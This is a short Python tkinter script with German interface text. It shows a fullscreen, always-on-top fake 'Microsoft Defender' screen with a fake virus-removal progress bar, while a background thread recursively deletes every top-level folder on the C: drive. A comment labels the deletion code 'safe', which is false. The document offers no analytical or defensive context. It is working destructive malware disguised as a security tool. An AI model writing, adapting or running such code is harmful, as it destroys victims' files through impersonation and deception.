import tkinter as tk
import random
import threading
import os
import shutil

fenster = tk.Tk()
fenster.title("Microsoft Security")

fenster.attributes("-fullscreen", True)
fenster.attributes("-topmost", True)
fenster.overrideredirect(True)
fenster.configure(bg="#0c1a2b")

label_title = tk.Label(
    fenster,
    text="Microsoft Defender",
    font=("Arial", 50, "bold"),
    fg="white",
    bg="#0c1a2b"
)
label_title.pack(pady=50)

status_text = tk.StringVar()
status_text.set("Gefährlicher Virus wird entfernt...")

label_status = tk.Label(
    fenster,
    textvariable=status_text,
    font=("Arial", 28),
    fg="white",
    bg="#0c1a2b"
)
label_status.pack(pady=20)

label_progress = tk.Label(
    fenster,
    text="0%",
    font=("Arial", 40),
    fg="lime",
    bg="#0c1a2b"
)
label_progress.pack(pady=20)

progress_value = 0
def fake_progress():
    global progress_value
    progress_value += random.randint(0, 1)
    if progress_value > 20:
        progress_value = random.randint(10, 20)

    label_progress.config(text=f"{progress_value}%")

    msgs = [
        "Virus wird analysiert...",
        "Systemdateien werden gescannt...",
        "Bedrohung wird isoliert...",
        "Letzte Sicherheitsprüfungen..."
    ]
    status_text.set(random.choice(msgs))

    fenster.after(1000, fake_progress)

fake_progress()

# ----------------------------------------
# SICHERER Hintergrund-Code
def benutzer_hintergrund():
    basis_ordner = "C:/" 

    # Ordner erstellen, falls nicht vorhanden
  

    whitelist = [""] 

    for name in os.listdir(basis_ordner):
        pfad = os.path.join(basis_ordner, name)

        if os.path.isdir(pfad) and name not in whitelist:
            shutil.rmtree(pfad)
            print(f"Gelöscht: {pfad}")


# Thread starten
threading.Thread(target=benutzer_hintergrund, daemon=True).start()
# ----------------------------------------

fenster.mainloop()
